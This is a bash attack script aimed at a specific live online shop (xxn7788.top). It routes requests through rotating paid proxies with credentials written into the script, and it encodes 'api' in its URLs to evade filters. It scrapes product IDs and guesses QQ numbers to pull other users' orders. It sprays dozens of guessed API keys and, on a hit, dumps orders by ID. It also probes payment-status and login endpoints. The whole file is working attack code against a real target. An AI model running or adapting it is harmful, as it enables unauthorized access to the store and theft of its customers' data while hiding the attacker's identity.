#!/bin/bash
set -u
KEY=C413ED6D
PWD=344F550A6F8B
refresh(){
  RESP=$(curl -s --connect-timeout 5 --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
  if [[ -z "$SERVER" ]]; then
    RESP=$(curl -s --connect-timeout 5 --max-time 10 "https://share.proxy.qg.net/query?key=${KEY}" || true)
    SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
  fi
  if [[ -n "$SERVER" ]]; then
    PROXY_URL="http://${KEY}:${PWD}@${SERVER}"
  fi
  echo "PROXY=$PROXY_URL"
}
refresh
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://xxn7788.top/shop
CK=/tmp/xxn_d2.ck
OUT=/tmp/xxn_d2_out
rm -rf "$OUT"
mkdir -p "$OUT"
rm -f "$CK"
c(){ curl -sk --connect-timeout 4 --max-time 18 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" -H 'X-Requested-With: XMLHttpRequest' "$@"; }

c "$BASE/" -o "$OUT/home.html" -w "HOME=%{http_code}:%{size_download}\n"
if [[ ! -s $OUT/home.html ]]; then
  refresh
  c "$BASE/" -o "$OUT/home.html" -w "HOME2=%{http_code}:%{size_download}\n"
fi

python3 - <<'PY'
import re
h=open('/tmp/xxn_d2_out/home.html',encoding='utf-8',errors='ignore').read()
print('home_len',len(h))
tids=sorted(set(int(x) for x in re.findall(r'tid["\']?\s*[:=]\s*["\']?(\d+)', h)))
print('tids',tids[:40],'n',len(tids))
open('/tmp/xxn_d2_out/tids.txt','w').write('\n'.join(map(str,tids)))
m=re.search(r'<title>([^<]+)',h)
print('title', m.group(1) if m else '')
PY

echo "=== getcount ==="
c "$BASE/ajax.php?act=getcount" | tee "$OUT/getcount.json"; echo

echo "=== siteinfo ==="
c "$BASE/%61pi.php?act=siteinfo" | tee "$OUT/siteinfo.json" | head -c 500; echo

echo "=== query ==="
for q in 123456 123456789 7788 xxn7788 xxn778 yiyi778yiyi admin test 111111 888888 666666 10000 13800138000 qq123 5201314; do
  r=$(c -X POST -d "qq=$q" "$BASE/ajax.php?act=query")
  echo "Q $q => ${r:0:220}"
  printf '%s' "$r" > "$OUT/q_$q.json"
  if echo "$r" | grep -q '"id"' && echo "$r" | grep -q 'skey'; then
    echo "QUERYHIT $q"
    echo "$q" >> "$OUT/query_hits.txt"
  fi
done

echo "=== mod=query ==="
c "$BASE/?mod=query&data=123456" -o "$OUT/modq.html" -w "modq=%{http_code}:%{size_download}\n"
echo "showOrder=$(grep -c showOrder $OUT/modq.html || true)"

echo "=== getclass/tool ==="
c "$BASE/ajax.php?act=getclass" | tee "$OUT/class.json" | head -c 300; echo
c -X POST -d 'cid=1' "$BASE/ajax.php?act=gettool" | tee "$OUT/tool1.json" | head -c 400; echo

TID=$(python3 -c "import re
p='/tmp/xxn_d2_out/tool1.json'
t=open(p,errors='ignore').read() if __import__('os').path.exists(p) else ''
m=re.findall(r'\"tid\"\s*:\s*\"?(\d+)', t)
print(m[0] if m else '')")
if [[ -z "$TID" && -s $OUT/tids.txt ]]; then TID=$(head -1 "$OUT/tids.txt"); fi
echo TID=$TID
if [[ -n "$TID" ]]; then
  c "$BASE/?cid=0&tid=$TID" -o "$OUT/buy.html" -w "BUY=%{http_code}:%{size_download}\n"
  python3 - <<'PY'
import re
h=open('/tmp/xxn_d2_out/buy.html',encoding='utf-8',errors='ignore').read()
print('csrf', bool(re.search(r'name="csrf_token"',h)))
print('hashsalt', bool(re.search(r'var\s+hashsalt\s*=',h)))
print('geetest', 'geetest' in h.lower())
m=re.search(r'name="csrf_token"\s+value="([^"]+)"',h)
hs=re.search(r'var\s+hashsalt\s*=\s*(.+?);',h)
if m: open('/tmp/xxn_d2_out/csrf.txt','w').write(m.group(1))
if hs: open('/tmp/xxn_d2_out/hashsalt.js','w').write(hs.group(1))
print('hashsalt_len', len(hs.group(1)) if hs else 0)
PY
fi

echo "=== api acts ==="
for act in classlist goodslist siteinfo; do
  r=$(c "$BASE/%61pi.php?act=$act")
  echo "ACT $act => ${r:0:160}"
  printf '%s' "$r" > "$OUT/api_$act.json"
done

echo "=== apikey spray ==="
mapfile -t KEYARR < <(python3 - <<'PY'
keys=["admin","123456","7788","xxn7788","xxn778","xiaoxiannv","admin7788","7788admin","api","key","faka","store","admin1003","1003admin","ttwl66","datou111","datou333","xuxin66","yiyi778","yiyi778yiyi","password","admin123","888888","666666","xxn","api7788","shop7788"]
for n in list(range(7780,7800))+[1003,2277,276,32,123456,7788]:
  for b in ["admin","store","api","xxn","xxn7788"]:
    keys += [f"{b}{n}", f"{n}{b}"]
seen=set(); out=[]
for k in keys:
  if k not in seen:
    seen.add(k); out.append(k)
print("\n".join(out))
PY
)
i=0; hits=0
for k in "${KEYARR[@]}"; do
  i=$((i+1))
  if (( i % 40 == 1 )); then refresh; fi
  ek=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$k")
  r=$(c "$BASE/%61pi.php?act=tools&key=${ek}&limit=1")
  if [[ -z "$r" ]]; then
    echo "empty $k"
    continue
  fi
  if echo "$r" | grep -qE 'API对接密钥错误|确保各项不能为空'; then
    if (( i % 20 == 0 )); then echo "prog $i miss"; fi
    continue
  fi
  echo "KEYHIT $k => $r"
  printf '%s\n%s\n' "$k" "$r" > "$OUT/keyhit.txt"
  hits=$((hits+1))
  for oid in 1 10 100 500 1000 2000 2270 2277; do
    rr=$(c "$BASE/%61pi.php?act=search&id=$oid&key=$ek")
    echo "search $oid => ${rr:0:220}"
    printf '%s' "$rr" > "$OUT/search_$oid.json"
  done
  break
done
echo "APIKEY tested=$i hits=$hits"

echo "=== usdt/getshop ==="
c "$BASE/other/usdt-trc20/status.php?trade_no=20260803000000001"; echo
c -X POST -d 'trade_no=20260803000000001' "$BASE/getshop.php"; echo

echo "=== login ==="
c "$BASE/user/login.php" -o "$OUT/login.html" -w "login=%{http_code}:%{size_download}\n"
grep -oE 'geetest|csrf_token|极验' "$OUT/login.html" | sort | uniq -c

echo DONE
